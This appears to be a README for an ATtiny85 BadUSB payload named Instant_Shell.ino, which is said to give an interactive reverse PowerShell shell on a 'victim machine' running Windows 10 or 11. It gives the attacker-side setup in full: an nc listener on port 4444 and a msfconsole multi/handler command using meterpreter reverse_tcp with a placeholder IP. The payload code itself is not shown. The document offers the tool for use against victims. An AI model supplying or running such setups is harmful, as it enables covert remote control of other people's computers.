# Instant Shell

### Description:

#### 1: Instant_Shell.ino:<br>

**Payload by:** [hum4nG0D](https://github.com/hum4nG0D/)

Get instant interactive reverse powershell shell in less than a minute and send commands remotely to victim machine. Interactive reverse Powershell shell script from [Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html)

**Instructions:**
Start an nc listener or metasploit listener. Be sure to change IP and Port. Adjust script delay which suits best to your computer.

```
nc -lvnp 4444
```

```
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP_ADDRESS>; set lport 4444; set ExitOnSession false; exploit -j"
```

**Tested on:**<br>
**OS**: Windows 10|11<br>
**User**: Admin/Normal User<br>
**Hardware**: ATtiny85
